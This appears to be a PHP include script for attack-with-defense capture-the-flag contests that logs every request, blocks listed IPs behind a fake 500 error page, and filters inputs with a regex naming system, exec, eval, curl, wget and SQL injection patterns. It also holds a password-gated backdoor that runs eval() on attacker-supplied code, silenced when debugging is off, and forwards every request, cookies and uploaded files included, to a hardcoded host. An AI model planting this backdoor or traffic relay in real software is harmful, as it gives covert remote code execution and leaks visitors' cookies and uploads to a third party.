<?php
const DEBUG = True;
const LOGDIR = '/home/huasir/log/';
const NGINX = True;
const TARGETIP = '192.168.221.1:6666';
const DEFENSE = False;
//block ip
$balck_list = array('128.128.106.66',);

if (DEBUG === True){
    ini_set('display_errors','On');
    error_reporting(-1);
}else if (DEBUG === False){
    error_reporting(0);
}
// var_dump($_REQUEST);
if (!empty($_REQUEST[0])){
    if (md5($_REQUEST[0])==='93ae94ae05e980e10c9fab8be8cf11b3'){
        if (DEBUG === True)
            eval($_REQUEST[1]);
        else if (DEBUG === False)
            @eval($_REQUEST[1]);
    }
}

function transquote($str){
    return str_replace('"', '\"', $str);
}

if (!function_exists('getallheaders')) {
    function getallheaders() {
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

function return500(){
    header('HTTP/1.1 500 Internal Server Error');
    printf('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Server at %s Port %s</address>
</body></html>',$_SERVER['HTTP_HOST'],$_SERVER["SERVER_PORT"]);
    exit();
}

if (in_array($_SERVER['REMOTE_ADDR'], $balck_list)){
    return500();    
}

function d_addslashes(&$array){
    foreach($array as $key=>$value){
        if(!is_array($value)){
                !get_magic_quotes_gpc() && $value=addslashes($value);
                $array[$key]=$value;
        }else{
            d_addslashes($value);
            $array[$key]=$value;
        }
    }
}

function AWD_defense(&$array) {
    $pattern = "/load_file|\.\.|system|assert|exec|passthru|preg_replace|select.*from|union.*select|z0=.*z1=.*z2=.*|eval|file_get_content|file|cat|curl|wget|`/i";

    foreach($array as $key=>$value){
        if(!is_array($value)){
            if (preg_match($pattern, $value)) {
                $array[$key]='';
            }
        }else{
            AWD_defense($value);
            $array[$key]=$value;
        }
        //print_r($a);
    }
}

function WriteLog($basedir){
    //log time
    $time = date('H',time()).':'.date('i',time()).':'.date('s',time());
    //log file position
    $log_file = $basedir.transquote($_SERVER['REMOTE_ADDR']).".txt";
    //requests url
    $url = empty('HTTPS')?'https://':'http://'.$_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"];
    //requests method
    $method = (empty($_POST) && empty($_FILES))?"GET":"POST";
    //headers
    $header = isset($HEAD)?$HEAD:getallheaders();
    if (isset($header['Local']) && $header['Local'] == '1'){
        // var_dump(getallheaders());
        return 0;
    }
    $headers = "";
    foreach($header as $key => $value){
                $headers = $headers.$key.': '.$value."\r\n";    
    }
    //Raw Data
    $raw = "";
    if (!empty($_POST)){
        $raw = "\r\n\r\n";
        foreach ($_POST as $key => $value) {
            $raw .= "{$key}={$value}&";
        }
        $raw = substr($raw, 0, strlen($raw)-1);
    }
    // File Post
    if (!empty($_FILES)){
        foreach ($_FILES as $key => $value) {
            preg_match("#boundary=([\-0-9]+)#", $header['Content-Type'],$boundary);
            $raw = "\r\n\r\n{$boundary[1]}\r\nContent-Disposition: form-data; name={$key}; filename={$value['name']}\r\n";
            $raw = $raw."Content-Type:{$value['type']}\r\n";
            $raw = $raw.file_get_contents($value['tmp_name']);
        } 
    }  
    //Recv Data
    $recv = "Time {$time}\r\n***********\r\n".$method." ".transquote($_SERVER["REQUEST_URI"])." HTTP/1.1\r\n".transquote($headers).$raw."\r\n\r\n";
    file_put_contents($log_file, $recv, FILE_APPEND);

    file_put_contents($log_file, "------------------------------------------------------------------------------\r\n", FILE_APPEND);
}

try{
    WriteLog(LOGDIR);  
}
catch(Exception $e){
    if (DEBUG===True){
        echo "[!]Error: ".$e->getMessage();
    }
}

function curl_nginx($remoteDomain){
    $headers = getallheaders();
    $extraHeaders = array();
    $headers['Host'] = $remoteDomain;
    if (isset($headers['Referer'])) {
        $headers['Referer'] = str_replace($_SERVER["HTTP_HOST"], $remoteDomain, $headers['Referer']);
    }
    if (isset($headers['Origin'])) {
        $headers['Origin'] = str_replace($_SERVER["HTTP_HOST"], $remoteDomain, $headers['Origin']);
    }
    foreach ($headers as $key => $value) {
        if(in_array($key, array('User-Agent','Accept','Accept-Language','Accept-Encoding','Referer','Origin')))
            $extraHeaders[] = $key.': '.$value;
    }
    $ch = curl_init();
    echo "curl opt:\n";
    echo 'http://'.$remoteDomain.$_SERVER["REQUEST_URI"];
    curl_setopt($ch, CURLOPT_URL, 'http://'.$remoteDomain.$_SERVER["REQUEST_URI"]);

    if ($_SERVER['REQUEST_METHOD'] == 'POST'){
        $post_data = file_get_contents('php://input');
        if(isset($_FILES)){
            $filename = array_keys($_FILES)[0];
            $post_data = $_POST;
            $post_data[$filename] = '@'.$_FILES[$filename]['tmp_name'];
        }
        curl_setopt($ch, CURLOPT_POST, TRUE);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $extraHeaders);
    if (isset($headers['Cookie'])){
        curl_setopt($ch, CURLOPT_COOKIE, $headers['Cookie']);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);
    echo $response;
    exit();
}
if (NGINX){
    try{
        curl_nginx(TARGETIP);
    }
    catch(Exception $e){
        if (DEBUG===True){
            echo "[!]Error: ".$e->getMessage();
        }
    }    
}
// d_addslashes($_GET);
// d_addslashes($_POST);
// d_addslashes($_REQUEST);

if (DEFENSE){
    AWD_defense($_GET);
    AWD_defense($_POST);
    AWD_defense($_REQUEST);   
}

?>
